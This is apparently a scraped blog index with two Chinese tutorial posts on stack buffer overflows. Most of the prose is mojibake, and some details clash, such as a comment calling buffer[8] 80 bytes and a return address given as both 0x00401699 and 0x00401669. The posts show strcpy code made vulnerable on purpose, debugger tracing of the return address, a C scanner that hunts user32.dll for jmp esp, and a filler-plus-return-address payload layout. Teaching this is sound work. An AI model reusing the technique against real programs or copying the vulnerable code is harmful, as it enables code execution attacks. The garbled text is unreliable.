·å°±å¯ä»¥æŠŠå¯¹æ ˆå†…å­˜æ”¾çš„è¿”å›åœ°å€çš„é‚£ä¸€ä¸ªå…ƒç´ è¦†ç›–ä¸ºç›¸åº”çš„è·³æ¿åœ°å€ã€‚ â€‹ æˆ‘ä»¬ç”»å›¾æ¥ç†è§£ä¸€ä¸‹ï¼Œä¸Šé¢çš„è¯æ˜¯ä»€ä¹ˆæ„æ€. æˆ‘ä»¬ä¹Ÿç”¨ODè½½å…¥ä¸Šä¸€ç¯‡ä¸­çš„test1.exeï¼Œæ¥å…·ä½“åˆ†æä¸€ä¸‹ï¼Œä¸Šé¢è¯´çš„ä»€ä¹ˆæ„æ€ï¼ æˆ‘ä»¬ç›´æ¥æ‰§è¡Œåˆ°mianå‡½æ•°æœ€åä¸€ä¸ªåœ°å€ï¼Œç„¶åF8ä¸€æ­¥æ­¥æ‰§è¡Œåˆ°0x4010a6åœ°å€ä¸­, å³retnè¯­å¥å¤„ï¼Œæ­¤æ—¶æˆ‘ä»¬å…³æ³¨ä¸€ä¸‹espå¯„å­˜å™¨æ‰€ä¿å­˜çš„å€¼ï¼š å…³æ³¨æˆ‘æ ‡ç®­å¤´çš„å‡ ä¸ªä½ç½®ï¼Œæˆ‘ä»¬ç»§ç»­æ‰§è¡Œï¼š ä¸»è¦å…³æ³¨espçš„å€¼ã€‚å¯ä»¥å‘ç°ï¼Œespçš„å€¼ç”±åˆšæ‰çš„0x0012FF84å˜æˆäº†0x0012FF88ï¼Œä»æ ˆç©ºé—´æ¥çœ‹ï¼Œå³åˆšæ‰é‚£ä¸ªå€¼çš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚ä¸è¦å¿˜äº†ï¼Œ0x0012FF84ä½ç½®æ­£å¼æˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„è¿”å›åœ°å€çš„ä½ç½®ã€‚ â€‹ æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œå½“mainå‡½æ•°æ‰§è¡Œå®Œæ¯•çš„æ—¶å€™ï¼Œespçš„å€¼ä¼šè‡ªåŠ¨å˜æˆè¿”å›åœ°å€çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œè€Œespçš„è¿™ç§å˜åŒ–ï¼Œä¸€èˆ¬æ˜¯ä¸å—ä»»ä½•æƒ…å†µå½±å“çš„ã€‚æ—¢ç„¶æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸€ä¸ªç‰¹æ€§ï¼Œé‚£ä¹ˆå…¶å®å°±å¯ä»¥å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºespæ‰€ä¿å­˜çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥è®©ç¨‹åºè·³è½¬åˆ°espæ‰€ä¿å­˜çš„åœ°å€ä¸­ï¼Œå»æ‰§è¡Œæˆ‘ä»¬æ‰€æ„é€ çš„æŒ‡ä»¤ï¼Œä»¥ä¾¿è®©è®¡ç®—æœºæ‰§è¡Œã€‚ â€‹ å½“ç„¶äº†ï¼Œä»¥ä¸Šæˆ‘æ‰€è®²çš„æ˜¯æ­£å¸¸çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¿”å›åœ°å€æ²¡æœ‰è¢«ç ´åçš„æƒ…å†µï¼Œé‚£ä¹ˆå¦‚æœè¿”å›åœ°å€è¢«ç ´åäº†ï¼Œespè¿˜å…·å¤‡è¿™ç§ç‰¹æ€§å—ï¼Ÿä¸å¦¨å†ç”¨ODè½½å…¥test4.exeè¿™ä¸ªå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºé—®é¢˜çš„ç¨‹åºï¼Œæ¥ç ”ç©¶ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰çš„å­—ç¬¦é•¿åº¦,æ²¡åŠæ³•è¦†ç›–åˆ°shellcodeéƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ é•¿å­—ç¬¦ï¼Œcä»£ç å¦‚ä¸‹: 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶char name[] = &quot;betaobetaobetaobetaobetao&quot;; //å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼int main() //è¿”å›å€¼ ä¸»å‡½æ•°main()&#123; char buffer[8]; //å¼€è¾Ÿ80ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name ï¼ï¼ï¼ strcpy(buffer,name); //å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡ printf(&quot;%s\\n&quot;,buffer); //è¾“å‡º getchar(); //æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”® return 0; //è¿”å›å€¼&#125; é¦–å…ˆè¿˜æ˜¯å…ˆæ¥åˆ°mainå‡½æ•°çš„retnçš„ä½ç½®ï¼š åˆ°è¿™é‡Œæˆ‘ä»¬å°±åº”è¯¥çŸ¥é“ï¼Œä¸ºä»€ä¹ˆè¦è·³è½¬äº†å§ï¼Ÿï¼Ÿï¼Ÿé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥è¦è§£å†³çš„å°±æ˜¯ï¼Œå¦‚æœè®©ç¨‹åºè·³è½¬åˆ° espçš„ä½ç½®å‘¢ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œjmp esp è¿™æ¡æŒ‡ä»¤ ,jmp espæŒ‡ä»¤å¯¹åº”çš„æœºå™¨ç æ˜¯0xFFE4 æˆ‘ä»¬æ¥ä¸‹æ¥ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ¥åœ¨user32.dllè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­å¯»æ‰¾jmp espè¿™ä¸ªæœºå™¨æŒ‡ä»¤çš„å†…å­˜åœ°å€ï¼ˆjmp espå¾ˆå¤šåŠ¨æ€é“¾æ¥åº“éƒ½æœ‰ï¼Œè¿™é‡Œåªæ˜¯åšä¸€ä¸ªä¾‹å­ï¼‰ï¼š Cä»£ç å¦‚ä¸‹: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define DLL_NAME &quot;user32.dll&quot;int main()&#123; BYTE* ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle=LoadLibrary(DLL_NAME); if(!handle) &#123; printf(&quot; load dll erro !&quot;); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) &#123; try &#123; if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4) &#123; //0xFFE4 is the opcode of jmp esp int address = (int)ptr + position; printf(&quot;OPCODE found at 0x%x\\n&quot;,address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf(&quot;END OF 0x%x\\n&quot;, address); done_flag = true; &#125; &#125; getchar(); return 0;&#125; æ³¨ï¼šç¼–è¯‘è¿è¡Œï¼Œæ–‡ä»¶åå¿…é¡»æ˜¯.cppåç¼€ï¼Œä¸èƒ½.c ç”±ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œåœ°å€éå¸¸å¤šï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨å€’æ•°ç¬¬äºŒè¡Œ0x77e35b79ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘éœ€è¦ä½¿ç”¨è¿™ä¸ªåœ°å€æ¥è¦†ç›–ç¨‹åºçš„è¿”å›åœ°å€ã€‚è¿™æ ·ï¼Œç¨‹åºåœ¨è¿”å›æ—¶ï¼Œå°±ä¼šæ‰§è¡Œjmp espï¼Œä»è€Œè·³åˆ°è¿”å›åœ°å€ä¸‹ä¸€ä¸ªä½ç½®å»æ‰§è¡Œè¯¥åœ°å€å¤„çš„è¯­å¥ã€‚ â€‹ è¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹ï¼šæœ‰å¾ˆå¤šç§æ–¹æ³•å¯ä»¥è·å–jmp espï¼Œè€Œä¸”ä¸åŒçš„ç³»ç»Ÿè¿™ä¸ªåœ°å€å¯èƒ½æ˜¯ä¸åŒçš„ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œåœ°å€çš„éªŒè¯ã€‚æˆ‘ä»¬éšä¾¿é™„åŠ ä¸€ä¸ªè¿›ç¨‹å¯æ‰§è¡Œæ–‡ä»¶ã€‚ æ€»ç»“â€‹ åˆ°è¿™é‡Œå¯ä»¥å…ˆæ€»ç»“ä¸€ä¸‹æˆ‘ä»¬å³å°†ç¼–å†™nameæ•°ç»„ä¸­çš„å†…å®¹äº†ï¼Œç»è¿‡ä»¥ä¸Šåˆ†æå¯çŸ¥é“ï¼Œå…¶å½¢å¼ä¸ºbetaobetaobeXXXXShellcode...,å‰é¢12ä¸ªä¸ºä»»æ„å­—ç¬¦ï¼ŒXXXXè¿”å›åœ°å€æˆ‘ä»¬ä½¿ç”¨0x77e35b79 è€ŒShellcode....ä¾¿æ˜¯æˆ‘ä»¬æƒ³è¦è®¡ç®—æœºæ‰§è¡Œçš„ä»£ç ã€‚shellcodeç¼–å†™å¾…æ›´â€¦(éœ€è¦æ±‡ç¼–åŸºç¡€)","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æº¢å‡ºæ”»å‡»","slug":"æº¢å‡ºæ”»å‡»","permalink":"https://bobtaoy.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"ç¼“å†²åŒºæº¢å‡ºåŸç†åˆ†æ(ä¸€)","slug":"ç¼“å†²åŒºæº¢å‡ºåŸç†åˆ†æ-ä¸€","date":"2020-10-06T00:25:57.000Z","updated":"2020-10-28T07:19:13.680Z","comments":true,"path":"2020/10/06/ç¼“å†²åŒºæº¢å‡ºåŸç†åˆ†æ-ä¸€/","link":"","permalink":"https://bobtaoy.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/","excerpt":"","text":"ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºï¼Ÿï¼Ÿï¼Ÿå…ˆä½œä¸‹ç±»æ¯”ï¼Œå¦‚æœæŸä¸ªäººæŠŠä¸€ç“¶å•¤é…’å…¨éƒ¨å€’å…¥ä¸€ä¸ªå°æ¯å­ä¸­ï¼Œé‚£è£…ä¸ä¸‹çš„å•¤é…’å°±ä¼šå››å¤„å†’å‡ºï¼Œæµåˆ°æ¡Œå­ä¸Šã€‚ åŒæ ·çš„é“ç†ï¼Œåœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œè¾“å…¥æ•°æ®é€šå¸¸è¢«å­˜æ”¾åœ¨ä¸€ä¸ªä¸´æ—¶ç©ºé—´å†…ï¼Œè¿™ä¸ªä¸´æ—¶å­˜æ”¾ç©ºé—´å°±è¢«ç§°ä¸ºç¼“å†²åŒºï¼Œç¼“å†²åŒºçš„é•¿åº¦äº‹å…ˆå·²ç»è¢«ç¨‹åºæˆ–è€…æ“ä½œç³»ç»Ÿå®šä¹‰å¥½äº†ã€‚ç¼“å†²åŒºå°±å¾ˆåƒé‚£ä¸ªå•¤é…’æ¯ï¼Œç”¨æ¥è£…ä¸œè¥¿ï¼Œè€Œä¸”å¤§å°å›ºå®šã€‚ å‘ç¼“å†²åŒºå†…å¡«å……æ•°æ®ï¼Œå¦‚æœæ•°æ®çš„é•¿åº¦å¾ˆé•¿ï¼ˆå¦‚åŒé‚£ç“¶å•¤é…’ï¼‰ï¼Œè¶…è¿‡äº†ç¼“å†²åŒºï¼ˆé‚£ä¸ªå•¤é…’æ¯ï¼‰æœ¬èº«çš„å®¹é‡ï¼Œé‚£ä¹ˆç»“æœå°±å¦‚åŒå•¤é…’ä¸€æ ·ï¼Œå››å¤„æº¢å‡ºï¼Œæ•°æ®ä¹Ÿä¼šæº¢å‡ºå­˜å‚¨ç©ºé—´ï¼è£…ä¸ä¸‹çš„å•¤é…’ä¼šæµåˆ°æ¡Œå­ä¸Šï¼Œè€Œè£…ä¸ä¸‹çš„æ•°æ®åˆ™ä¼šè¦†ç›–åœ¨åˆæ³•æ•°æ®ä¸Šï¼Œè¿™å°±æ˜¯ç¼“å†²åŒºå’Œç¼“å†²åŒºæº¢å‡ºçš„é“ç†ã€‚å½“ç„¶åœ¨ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œç¨‹åºæ£€æŸ¥æ¯ä¸ªæ•°æ®çš„é•¿åº¦ï¼Œå¹¶ä¸”ä¸å…è®¸è¶…è¿‡ç¼“å†²åŒºçš„é•¿åº¦å¤§å°ï¼Œå°±åƒåœ¨å€’å•¤é…’çš„æ—¶å€™ï¼Œå•¤é…’è¦å†’å‡ºæ¯å­æ—¶æˆ‘ä»¬å°±åœæ­¢ã€‚ä½†æœ‰äº›ç¨‹åºä¼šå‡è®¾æ•°æ®é•¿åº¦æ€»æ˜¯ä¸æ‰€åˆ†é…çš„å­˜å‚¨ç©ºé—´ç›¸åŒ¹é…ï¼Œè€Œä¸ä½œæ£€æŸ¥ï¼Œä»è€Œä¸ºç¼“å†²åŒºæº¢å‡ºåŸ‹ä¸‹éšæ‚£ã€‚OKï¼Œé‚£æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºå‘¢åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå°±åƒå•¤é…’ä¼šåˆ°å¤„æµæ»¡æ¡Œé¢ä¸€æ ·ï¼Œæº¢å‡ºçš„æ•°æ®ä¼šè¦†ç›–æ‰ä»»ä½•æ•°æ®ã€æŒ‡é’ˆæˆ–å†…å®¹ã€‚é™¤äº†ç ´åä¹‹å¤–ï¼Œå¯¹æ”»å‡»è€…æ¥è¯´æ²¡æœ‰ä»»ä½•å¥½å¤„ã€‚ä½†æˆ‘ä»¬å¯å¼•å¯¼æº¢å‡ºçš„æ•°æ®ï¼Œä½¿è®¡ç®—æœºæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚è¿™å°±æ˜¯å¾ˆå¤šæ¼æ´å…¬å‘Šä¸Šè¯´çš„ï¼šâ€˜é»‘å®¢å¯ä»¥ç”¨ç²¾å¿ƒæ„é€ çš„æ•°æ®â€¦â€¦ â€‹ - &gt; æ‘˜é€‰è‡ª ç‹ç‚œè€å¸ˆçš„ã€ŠQç‰ˆç¼“å†²åŒºæº¢å‡ºæ•™ç¨‹ã€‹ å®éªŒç¯å¢ƒ æ“ä½œæœºï¼š windows XP å·¥å…·ï¼š DA pro , OllyDbgï¼Œvc++6.0ï¼› æµ‹è¯•è½¯ä»¶ï¼štest1.exe, test2.exe æˆ‘ä»¬ä¸‹é¢çš„å®éªŒæ˜¯é€šè¿‡ç¼–å†™ä¸¤ä¸ªCä¾‹ç¨‹åºï¼Œä½¿ç”¨å·¥å…·ODï¼ŒIDA proè¿›è¡Œé€†å‘åˆ†æã€‚é’ˆå¯¹æ±‡ç¼–è¯­å¥ä¸­CALLæœºåˆ¶å‰–æç¼“å†²åŒºæº¢å‡ºçš„åŸºæœ¬åŸç† ã€‚ å®éªŒå‡†å¤‡ï¼šç¼–å†™Cä»£ç ç¨‹åºï¼Œç¼–è¯‘ test1.c,ä»£ç å¦‚ä¸‹ï¼š 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶char name[] = &quot;betao&quot;; //å®šä¹‰å…¨å±€å˜é‡int main() //è¿”å›å€¼ ä¸»å‡½æ•°main()&#123; char buffer[8]; //å¼€è¾Ÿ8ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name strcpy(buffer,name); //å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡ printf(&quot;%s\\n&quot;,buffer); //è¾“å‡º getchar(); //æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”® return 0; //è¿”å›å€¼&#125; ä»¥ä¸Štest1.cä»£ç ä¸­ï¼Œå› ä¸ºâ€™betaoâ€™ä¸ºè¶…è¿‡bufferçš„ç©ºé—´ï¼Œæ‰€ä»¥ä¸ä¼šå¼•èµ·ç¼“å†²åŒºæº¢å‡º test2.cä»£ç å¦‚ä¸‹ï¼š 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶char name[] = &quot;betaobetaobetao&quot;; //å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼ æ³¨æ„ï¼Œè¿™é‡Œå¤šäº†ä¸¤ä¸ªbetaoint main() //è¿”å›å€¼ ä¸»å‡½æ•°main()&#123; char buffer[8]; //å¼€è¾Ÿ8ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name strcpy(buffer,name); //å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡ printf(&quot;%s\\n&quot;,buffer); //è¾“å‡º getchar(); //æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”® return 0; //è¿”å›å€¼&#125; ä»¥ä¸Štest2.cä»£ç ï¼Œå› ä¸ºcopyç»™bufferè¶…å‡ºäº†ç©ºé—´ï¼Œæ‰€ä»¥å¯¼è‡´ç¼“å†²åŒºæº¢å‡º å°†Cè¯­è¨€ä»£ç ä½¿ç”¨vc++6.0ç¼–ç¨‹æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¤§æ¦‚æ­¥éª¤ æ–°å»ºwin32 console application -&gt; æ–°å»º C++ æºæ–‡ä»¶ -&gt; ç¼–å†™ä»£ç  -&gt; ç¼–è¯‘(é€‰æ‹©win32 Debug) -&gt; ç”Ÿæˆexeå¯æ‰§è¡Œæ–‡ä»¶ ç¼–è¯‘é€‰æ‹©win32 debugæ“ä½œå¦‚ä¸‹ï¼š å³é”®ç‚¹å‡»èœå•ç©ºç™½å¤„â€”â€”é€‰æ‹©â€œç»„å»ºâ€â€”â€”é€‰æ‹©â€œWin32 Debugâ€œâ€”â€”é‡æ–°ç¼–è¯‘é“¾æ¥ é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ¥è¿è¡Œä¸€äº›ç¼–è¯‘å¥½äº†çš„å¯æ‰§è¡Œæ–‡ä»¶test1.exe and test2.exeï¼Œçœ‹çœ‹ä¸¤è€…åŒºåˆ« ç¬¬ä¸€ä¸ªç¨‹åºï¼Œæ²¡æœ‰ä»»ä½•å¼‚å¸¸ å¯è§ç¨‹åºå·²ç»å¾—åˆ°äº†æ­£ç¡®çš„æ‰§è¡Œä¸è¾“å‡ºã€‚ä½†æ˜¯æˆ‘åœ¨ç¨‹åºä¸­æ‰€åˆ›å»ºå‡ºæ¥çš„æ˜¯ä¸€ä¸ª8å­—èŠ‚é•¿åº¦çš„æ•°ç»„ï¼Œè€Œæˆ‘åœ¨ç¨‹åºä¸­çš„è¾“å…¥æ˜¯5ä¸ªå­—èŠ‚ã€‚å¦‚æœæˆ‘çš„è¾“å…¥è¶…è¿‡å…«ä¸ªå­—èŠ‚ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ‰§è¡Œç¬¬äºŒä¸ªç¨‹åº å¯è§ï¼Œç¨‹åºè™½ç„¶ä¹Ÿèƒ½å¤Ÿæ­£ç¡®è¾“å‡ºï¼Œä½†æ˜¯å´å¼¹å‡ºäº†é”™è¯¯æç¤ºå¯¹è¯æ¡†ã€‚ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Ÿæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ¥ç ”ç©¶ä¸€ä¸‹ã€‚ æˆ‘ä»¬é¦–å…ˆåˆ†æä¸€ä¸‹æ— å¼‚å¸¸çš„ç¨‹åºï¼Œä¹Ÿå°±æ˜¯test1.exeï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ollydbgæ¥åˆ†æ å°†test1.exeè½½å…¥ollydbgä¸­ï¼Œollydbgè½½å…¥æ–¹å¼æœ‰ä¸¤ç§ï¼š é¼ æ ‡ç›´æ¥å°†exeæ‰§è¡Œç¨‹åºæ‹–å…¥ODæ§ä»¶åŒºåŸŸ æ–‡ä»¶ -&gt; é™„åŠ  -&gt; é€‰æ‹©è¿è¡Œä¸­çš„ç¨‹åº å› ä¸ºæˆ‘ä»¬éœ€è¦ä»mainå‡½æ•°å¼€å§‹åˆ†æï¼Œè€Œä¸Šå›¾ï¼š004015B0åœ°å€ä¸ºè½¯ä»¶åˆå§‹è¿è¡Œåœ°å€ï¼Œå¹¶émainå‡½æ•°çš„èµ·å§‹åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾mainå‡½æ•°çš„å†…å­˜åœ°å€ã€‚æˆ‘ä»¬ä½¿ç”¨ IDA Pro æ‰“å¼€ç¨‹åºå¯»æ‰¾ï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°æŒ‰F8å•æ­¥æ‰§è¡Œï¼Œé€šè¿‡è§‚å¯Ÿè·å–ï¼Œä½†æ˜¯è¿™æ ·æœªå…éœ€è¦ä¸€å®šçš„ç»éªŒï¼Œè€Œä¸”ä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚æ‰€ä»¥æˆ‘ä»¬å°†ç¨‹åºæ‹–å…¥IDAä¸­ å¦‚æœä¸æ˜¯å›¾ä¸Šçš„æƒ…å†µï¼Œè€Œæ˜¯å›¾ä¸‹çš„æƒ…å†µï¼ŒæŒ‰ä¸€ä¸‹ç©ºæ ¼é”®ï¼Œå³å¯è°ƒå‡ºå›¾ä¸Šå†…å®¹ åŒå‡»è¿›å…¥å¦‚ä¸‹é¡µé¢ï¼š æŒ‰ä¸‹ç©ºæ ¼é”® å¯è§,IDAå·²ç»å¸®æˆ‘ä»¬è·å–äº†mainå‡½æ•°çš„å…¥å£åœ°å€ï¼Œå³0x00401010 ,æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ‡æ¢åˆ°ODä¸­ï¼ŒCtrl + G è¾“å…¥401010è·³åˆ°è¯¥ä½ç½®ï¼ŒæŒ‰F2è®¾ç½®ä¸€ä¸ªæ–­ç‚¹( æŸä¸ªå†…å­˜åœ°å€ä¸‹äº†F2æ–­ç‚¹,å½“ç¨‹åºè¿è¡Œåˆ°æ­¤å¤„çš„æ—¶å€™å°±ä¼šæ–­ä¸‹æ¥ ) ç”±ä¸Šé¢çš„æˆªå›¾ï¼Œæˆ‘ä»¬é™¤äº†å¯ä»¥çŸ¥é“mainå‡½æ•°çš„ä½ç½®å¤–ï¼Œæˆ‘ä»¬è¿˜ä»ä¸‹é¢é‚£æ®µè¯â€œè·³è½¬æ¥è‡ª 00401005â€ï¼ˆè‹±æ–‡ç‰ˆçš„æ˜¯ï¼šjump from 00401005ï¼‰å¾—çŸ¥mainå‡½æ•°æ˜¯ç”±ä½äº0x00401005ä½ç½®å¤„çš„è¯­å¥è·³è¿‡æ¥çš„ã€‚ç”±äºç¼“å†²åŒºæº¢å‡ºæ˜¯ä¸æ ˆç©ºé—´ç´§å¯†ç›¸å…³çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨åº”å½“åˆ†æè°ƒç”¨ï¼ˆCALLï¼‰mainå‡½æ•°å‰åï¼Œæ ˆç©ºé—´çš„æƒ…å†µï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦å®šä½ç©¶ç«Ÿæ˜¯å“ªæ¡è¯­å¥è°ƒç”¨äº†mainå‡½æ•°ã€‚å¦‚æœä»…ä»…é€šè¿‡ODï¼Œæˆ‘ä»¬æ˜¯æ¯”è¾ƒéš¾å®šä½çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘è¿˜æ˜¯ä½¿ç”¨IDA Proã€‚ ç”±äºå·²ç»çŸ¥é“mainå‡½æ•°çš„åœ°å€æ˜¯0x00401010ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨IDAä¸­ï¼Œç”¨é¼ æ ‡åœ¨è¯¥åœ°å€ç‚¹ä¸€ä¸‹ï¼Œä¹‹ååˆ©ç”¨å¿«æ·é”®â€œCtrl+Xâ€æ‰“å¼€â€œäº¤å‰å¼•ç”¨çª—å£â€ï¼Œå°±æ¥åˆ°äº†jmpåˆ°æ­¤çš„å‡½æ•°ä½ç½®ï¼š ç„¶ååœ¨0x00401005çš„åœ°å€å¤„ï¼Œå†æ¬¡åˆ©ç”¨â€œäº¤å‰å¼•ç”¨â€åŠŸèƒ½ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ‰¾åˆ°è°ƒç”¨mainå‡½æ•°çš„ä½ç½®äº†ï¼š ä½äº 0x00401694å¤„çš„è¯­å¥è°ƒç”¨äº†mainå‡½æ•°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ODä¸­æ¥åˆ†æå †æ ˆçš„æƒ…å†µ ç»§ç»­Ctrl + G è¾“å…¥ 401694 è·³è½¬åˆ°æ‰§è¡Œmainå‡½æ•°çš„å†…å­˜åœ°å€ï¼ŒF2è®¾ç½®æ–­ç‚¹ æ³¨æ„ä¸Šå›¾ä¸­ çº¢è‰²ç®­å¤´å’Œé»„è‰²ç®­å¤´çš„åœ°æ–¹ â€‹ çº¢è‰²ç®­å¤´ CALLè¯­å¥ä¸‹é¢çš„åœ°å€æ˜¯0x00401699ã€‚è¿™ä¸ªåœ°å€å¾ˆé‡è¦ï¼Œä¸ºä»€ä¹ˆé‡è¦å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºåœ¨è¿›å…¥æ¯ä¸€ä¸ªCALLä¹‹å‰ï¼Œéƒ½ä¼šé¦–å…ˆå°†CALLä¸‹é¢é‚£æ¡è¯­å¥çš„åœ°å€å…¥æ ˆï¼Œç„¶åå†æ‰§è¡ŒCALLè¯­å¥ã€‚è¿™æ ·å½“CALLæ‰§è¡Œå®Œåï¼Œç¨‹åºå†å°†è¯¥åœ°å€å‡ºæ ˆï¼Œè¿™æ ·å°±èƒ½å¤ŸçŸ¥é“ä¸‹ä¸€æ­¥åº”è¯¥æ‰§è¡Œå“ªæ¡æŒ‡ä»¤. æˆ‘ä»¬ä¸€èˆ¬ä¹Ÿå°†è¿™ä¸ªåœ°å€ç§°ä¸ºâ€œè¿”å›åœ°å€â€ï¼Œå®ƒå‘Šè¯‰ç¨‹åºï¼šâ€œCALLæ‰§è¡Œå®Œåï¼Œè¯·æ‰§è¡Œè¿™ä¸ªåœ°å€å¤„çš„è¯­å¥ã€‚â€ æˆ‘ä»¬æŒ‰ä¸‹F9ï¼Œè·³è½¬åˆ°æ­¤ä½ç½®ï¼ŒæŸ¥çœ‹æ ˆä¸­å†…å®¹ï¼š æˆ‘ä»¬æ¥ä¸‹æ¥æŒ‰F7ï¼Œè¿›å…¥è¿™ä¸ªCALL,æ­¤æ—¶å†çœ‹ä¸€ä¸‹æ ˆç©ºé—´(æ³¨ï¼šæ ˆç©ºé—´ç”±ä¸‹è‡³ä¸Šæ˜¯é«˜åœ°å€å¾€ä½åœ°å€å¤„èµ°çš„ ) æ˜¯ä¸Šä¸Šå›¾CALLè¯­å¥ä¸‹ä¸€ä¸ªå†…å­˜åœ°å€å“¦ï¼Œç”±æ­¤å¯è§ï¼Œè¿”å›åœ°å€0x00401669å·²ç»å…¥æ ˆ . åˆ†æmainå‡½æ•°çš„ç¼“å†²åŒºæƒ…å†µ å› ä¸ºæˆ‘ä»¬åœ¨æºç¨‹åºä¸­åˆ›å»ºäº†ä¸€ä¸ª8ä¸ªå­—èŠ‚å¤§å°çš„æ•°ç»„ï¼Œå› æ­¤è¿›å…¥mainå‡½æ•°åçš„é¦–è¦å·¥ä½œå°±æ˜¯ä¸ºè¿™ä¸ªå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´ã€‚ç”±äºæˆ‘ä»¬çš„ç¨‹åºæ˜¯ä»¥Debugå½¢å¼ç¼–è¯‘çš„ï¼Œæ‰€ä»¥å®ƒä¼šå¤šåˆ†é…ä¸€äº›ç©ºé—´ï¼ˆReleaseç‰ˆæœ¬åˆ™ä¼šåˆ†é…æ­£å¥½çš„ç©ºé—´ï¼‰ã€‚ç»“åˆæœ¬ç¨‹åºå¯ä»¥çœ‹åˆ°ï¼Œå®ƒä¸ºæˆ‘ä»¬åˆ†é…çš„å±€éƒ¨å˜é‡ç©ºé—´å¤§å°ä¸º0x4C(7C - 34)-&gt;ï¼ˆF8ä¸€æ­¥æ­¥å‘ä¸‹æ‰§è¡Œï¼‰ï¼š 